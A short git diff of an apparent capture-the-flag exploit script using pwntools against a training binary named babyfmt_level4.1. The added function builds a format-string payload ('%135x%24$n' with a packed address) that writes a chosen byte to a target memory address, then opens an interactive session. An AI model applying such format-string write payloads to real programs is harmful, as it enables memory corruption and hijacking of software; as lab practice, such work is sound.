@@ -13,8 +13,14 @@ def level_4_0(p):
     data = b'%216x%31$n.......' + p64(0x404100)
     p.sendafter('Send your data!', data)
 
+def level_4_1(p):
+    '''Write 0x87 (135) to 0x404158
+    '''
+    data = b'%135x%24$n' + p64(0x404158)
+    p.sendafter('Send your data!', data)
 
-level = 4.0
+
+level = 4.1
 p = process(f'/challenge/babyfmt_level{level}')
 #p = gdb.debug(f'./babyfmt_level{level}', '''
 #b read
@@ -27,6 +33,6 @@ p = process(f'/challenge/babyfmt_level{level}')
 #c
 #''')
 
-level_4_0(p)
+level_4_1(p)
 
 p.interactive()
